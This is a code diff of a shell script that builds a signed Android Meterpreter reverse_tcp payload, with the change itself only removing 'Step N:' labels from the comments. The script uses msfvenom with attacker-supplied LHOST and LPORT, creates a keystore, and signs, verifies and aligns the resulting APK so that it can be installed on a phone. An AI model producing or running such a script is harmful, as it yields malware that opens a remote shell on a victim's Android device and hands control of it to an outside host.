@@ -9,25 +9,25 @@ fi
 LHOST=$1
 LPORT=$2
 
-# Step 1: Generate the payload with msfvenom
+# Generate the payload with msfvenom
 echo "[*] Generating payload..."
 sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o android.apk
 
-# Step 2: Generate the keystore
+# Generate the keystore
 echo "[*] Generating keystore..."
 keytool -genkey -V -keystore key.keystore -alias emi -keyalg RSA -keysize 2048 -validity 10000 \
     -dname "CN=YourName, OU=YourOrg, O=YourOrg, L=YourCity, ST=YourState, C=YourCountry" \
     -storepass password -keypass password
 
-# Step 3: Sign the APK
+# Sign the APK
 echo "[*] Signing the APK..."
 sudo jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore android.apk emi
 
-# Step 4: Verify the signed APK
+# Verify the signed APK
 echo "[*] Verifying the APK..."
 sudo jarsigner -verify -verbose -certs android.apk
 
-# Step 5: Align the APK
+# Align the APK
 echo "[*] Aligning the APK..."
 zipalign -v 4 android.apk signed_jar.apk
 
